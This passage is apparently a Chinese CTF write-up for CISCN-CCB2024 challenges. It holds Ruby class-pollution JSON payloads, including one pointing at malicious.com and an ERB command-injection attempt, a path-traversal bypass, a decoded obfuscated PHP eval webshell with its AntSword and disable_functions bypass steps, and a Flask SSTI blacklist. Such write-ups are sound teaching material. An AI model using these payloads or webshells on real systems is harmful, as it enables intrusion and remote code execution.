punctuation">,</span>      <span class="token symbol">age</span><span class="token operator">:</span> <span class="token number">30</span><span class="token punctuation">,</span>      <span class="token symbol">details</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string-literal"><span class="token string">"occupation"</span></span> <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Engineer"</span></span><span class="token punctuation">,</span>        <span class="token string-literal"><span class="token string">"location"</span></span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>          <span class="token string-literal"><span class="token string">"city"</span></span> <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Madrid"</span></span><span class="token punctuation">,</span>          <span class="token string-literal"><span class="token string">"country"</span></span> <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Spain"</span></span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">)</span>    user<span class="token punctuation">.</span>merge_with<span class="token punctuation">(</span>json_input<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'merged'</span></span> <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json  <span class="token keyword">end</span>  <span class="token comment"># GET /launch-curl-command - Activates the first gadget</span>  get <span class="token string-literal"><span class="token string">'/launch-curl-command'</span></span> <span class="token keyword">do</span>    content_type <span class="token symbol">:json</span>    <span class="token comment"># This gadget makes an HTTP request to the URL stored in the User class</span>    <span class="token keyword">if</span> Person<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span><span class="token symbol">:url</span><span class="token punctuation">)</span>      url <span class="token operator">=</span> Person<span class="token punctuation">.</span>url      response <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span><span class="token constant">HTTP</span><span class="token punctuation">.</span>get_response<span class="token punctuation">(</span><span class="token constant">URI</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HTTP request made'</span></span><span class="token punctuation">,</span> <span class="token symbol">url</span><span class="token operator">:</span> url <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json    <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'Failed to access URL variable'</span></span> <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json    <span class="token keyword">end</span>  <span class="token keyword">end</span>    get <span class="token string-literal"><span class="token string">'/sign_with_subclass_key'</span></span> <span class="token keyword">do</span>    content_type <span class="token symbol">:json</span>        signer <span class="token operator">=</span> <span class="token class-name">KeySigner</span><span class="token punctuation">.</span><span class="token keyword">new</span>    signed_data <span class="token operator">=</span> signer<span class="token punctuation">.</span>sign<span class="token punctuation">(</span>KeySigner<span class="token punctuation">.</span>signing_key<span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"data-to-sign"</span></span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'Data signed'</span></span><span class="token punctuation">,</span> <span class="token symbol">signing_key</span><span class="token operator">:</span> KeySigner<span class="token punctuation">.</span>signing_key<span class="token punctuation">,</span> <span class="token symbol">signed_data</span><span class="token operator">:</span> signed_data <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json  <span class="token keyword">end</span>    get <span class="token string-literal"><span class="token string">'/check-infected-vars'</span></span> <span class="token keyword">do</span>    content_type <span class="token symbol">:json</span>    <span class="token punctuation">&#123;</span>      <span class="token symbol">user_url</span><span class="token operator">:</span> Person<span class="token punctuation">.</span>url<span class="token punctuation">,</span>      <span class="token symbol">signing_key</span><span class="token operator">:</span> KeySigner<span class="token punctuation">.</span>signing_key    <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json  <span class="token keyword">end</span>  get<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'/'</span></span><span class="token punctuation">)</span> <span class="token keyword">do</span>    erb <span class="token symbol">:hello</span>  <span class="token keyword">end</span>  run<span class="token operator">!</span> <span class="token keyword">if</span> app_file <span class="token operator">==</span> $<span class="token number">0</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/HackTricks-wiki/hacktricks/blob/3e784b40f5711208c50e75daa3a5b1a839cb7316/pentesting-web/deserialization/ruby-class-pollution.md">https://github.com/HackTricks-wiki/hacktricks/blob/3e784b40f5711208c50e75daa3a5b1a839cb7316/pentesting-web/deserialization/ruby-class-pollution.md</a></p><p><a href="https://book.hacktricks.xyz/cn/pentesting-web/deserialization/ruby-class-pollution">https://book.hacktricks.xyz/cn/pentesting-web/deserialization/ruby-class-pollution</a></p><p><a href="https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html">https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html</a></p><p>payload：后者是随机找类覆盖的需要多次尝试</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"class"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"url"</span><span class="token operator">:</span><span class="token string">"Http://malicious.com"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"class"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"subclasses"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"sample"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"signing_key"</span><span class="token operator">:</span><span class="token string">"injected-signing-key"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>开头这个<code># frozen_string_literal: true</code>会冻结所有字符串字面量</p><p>观察一下改动的地方</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">set  <span class="token symbol">:bind</span> <span class="token punctuation">,</span>  <span class="token string-literal"><span class="token string">'0.0.0.0'</span></span>set  <span class="token symbol">:port</span> <span class="token punctuation">,</span>  <span class="token string-literal"><span class="token string">'8888'</span></span>  <span class="token keyword">return</span> <span class="token string-literal"><span class="token string">"try try try"</span></span>  <span class="token keyword">if</span> j_str<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"\\"</span></span><span class="token punctuation">)</span> <span class="token operator">||</span> j_str<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"h"</span></span><span class="token punctuation">)</span>  <span class="token keyword">if</span> Person<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span><span class="token symbol">:url</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> Person<span class="token punctuation">.</span>url    response <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span><span class="token constant">HTTP</span><span class="token punctuation">.</span>get_response<span class="token punctuation">(</span><span class="token constant">URI</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HTTP request made'</span></span><span class="token punctuation">,</span> <span class="token symbol">url</span><span class="token operator">:</span> url <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么就是ban了反斜杠和<code>h</code>，同时 curl 无回显</p><p>可以用<code>H</code>绕过</p><p>然后接下来的思路是在 JSONMergerApp 里找一个能污染的属性来实现类似于静态文件读取或者 getshell</p><p>这里尝试污染hello模板</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"class"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"subclasses"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"sample"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"templates"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"hello"</span><span class="token operator">:</span> <span class="token string">"&lt;%= `whoami` %>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>想起来有waf，绕不过去</p><p>或者设置静态目录</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"class"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"subclasses"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"sample"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"public_folder"</span><span class="token operator">:</span> <span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="helloweb（复现）"><a href="#helloweb（复现）" class="headerlink" title="helloweb（复现）"></a>helloweb（复现）</h1><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/index.php?file=hello.php</span> <span class="token http-version property">HTTP/1.1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Sun, 15 Dec 2024 02:10:51 GMT</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html; charset=UTF-8</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Vary</span><span class="token punctuation">:</span> <span class="token header-value">Accept-Encoding</span></span><span class="token header"><span class="token header-name keyword">tip</span><span class="token punctuation">:</span> <span class="token header-value">&amp;#105;&amp;#110;&amp;#99;&amp;#108;&amp;#117;&amp;#100;&amp;#101;&amp;#46;&amp;#112;&amp;#104;&amp;#112</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">2470</span></span>&lt;!-- ../hackme.php -->&lt;!--  ../tips.php  -->&lt;div class="relocating">Navigating to: &lt;span class="relocate-location">&lt;/span>...&lt;/div><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>tip解码出来是 include.php，但是访问不到这个文件</p><p>index.php，hello.php，hackme.php，tips.php 均在同一文件夹下，但是上面的 hint 里是<code>../</code>，而我们输入的 ..&#x2F;hackme.php 实际上访问的也是 hackme.php</p><p>结合 Navigating ，猜测替换了<code>../</code>为空，有双写绕过，尝试<code>..././hackme.php</code></p><p>能读到</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$lJbGIY</span><span class="token operator">=</span><span class="token string double-quoted-string">"eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME"</span><span class="token punctuation">;</span><span class="token variable">$OlWYMv</span><span class="token operator">=</span><span class="token string double-quoted-string">"zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel"</span><span class="token punctuation">;</span><span class="token variable">$lapUCm</span><span class="token operator">=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$YwzIst</span><span class="token operator">=</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">33</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">30</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$OxirhK</span><span class="token operator">=</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">33</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">24</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">24</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$YpAUWC</span><span class="token operator">=</span><span class="token variable">$OxirhK</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">18</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$OxirhK</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$OxirhK</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">24</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$rVkKjU</span><span class="token operator">=</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">13</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$YwzIst</span><span class="token operator">.=</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">22</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">36</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">29</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">26</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">30</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">32</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">35</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">26</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">30</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$YwzIst</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw=="</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$YwzIst 是 base64_decode，decode后的内容：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$uWcdaA</span><span class="token operator">=</span><span class="token string double-quoted-string">"eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxMEzqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrelmM9jWAfxqnT2UYjLKi9qw1DFYNIhgYRsDhUVBwEXGvE7HM8+Ox=="</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?>'</span><span class="token operator">.</span><span class="token variable">$YwzIst</span><span class="token punctuation">(</span><span class="token variable">$OxirhK</span><span class="token punctuation">(</span><span class="token variable">$YpAUWC</span><span class="token punctuation">(</span><span class="token variable">$uWcdaA</span><span class="token punctuation">,</span><span class="token variable">$rVkKjU</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$YpAUWC</span><span class="token punctuation">(</span><span class="token variable">$uWcdaA</span><span class="token punctuation">,</span><span class="token variable">$rVkKjU</span><span class="token punctuation">,</span><span class="token variable">$rVkKjU</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$YpAUWC</span><span class="token punctuation">(</span><span class="token variable">$uWcdaA</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$rVkKjU</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>复制到本地一步步 echo 分析出来</p><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215170723989.png" alt="image-20241215170723989"></p><p>那么shell就是：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd_66.99'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>蚁剑连上去，注意密码参数这里是<code>cmd[66.99</code></p><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">&lt;!-- ../hackme.php --></span><span class="token comment">&lt;!--  ../tips.php  --></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: ./index.php?file=hello.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    @<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'../'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php:\/\/|http|data|ftp|input|%00/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">14</span><span class="token punctuation">)</span>         <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h1>NAIVE!!!&lt;/h1>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span>             <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;div style='text-align: center;'>"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/div>"</span><span class="token punctuation">;</span>                <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试拿蚁剑插件打disable_function能写，但是连 .antproxy.php 上不去，不知道为什么</p><br><p>结束后试了一下直接在 &#x2F;tmp 写马 index.php，然后 fpm 起 phpserver 开在 &#x2F;tmp 下，密码填 &#x2F;tmp&#x2F;index.php 的即可绕过 disable_function 且正常连接</p><p>接下来找flag，本来以为要提权的，找了半天没提权点</p><p><code>find / -type f -name &quot;flag&quot; 2&gt;/dev/null</code>找到了神人flag路径</p><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215204605743.png" alt="image-20241215204605743"></p><hr><h1 id="safeproxy"><a href="#safeproxy" class="headerlink" title="safeproxy"></a>safeproxy</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template_string<span class="token keyword">import</span> socket<span class="token keyword">import</span> threading<span class="token keyword">import</span> htmlapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'&lt;pre>'</span><span class="token operator">+</span>html<span class="token punctuation">.</span>escape<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'&lt;/pre>'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">template</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    template_code <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span>    <span class="token comment"># 安全过滤</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> black <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> black <span class="token keyword">in</span> template_code<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Forbidden content detected!"</span>    result <span class="token operator">=</span> render_template_string<span class="token punctuation">(</span>template_code<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'ok'</span> <span class="token keyword">if</span> result <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">else</span> <span class="token string">'error'</span><span class="token keyword">class</span> <span class="token class-name">HTTPProxyHandler</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>target_host <span class="token operator">=</span> target_host        self<span class="token punctuation">.</span>target_port <span class="token operator">=</span> target_port    <span class="token keyword">def</span> <span class="token function">handle_request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> client_socket<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            request_data <span class="token operator">=</span> <span class="token string">b""</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                chunk <span class="token operator">=</span> client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>                request_data <span class="token operator">+=</span> chunk                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token 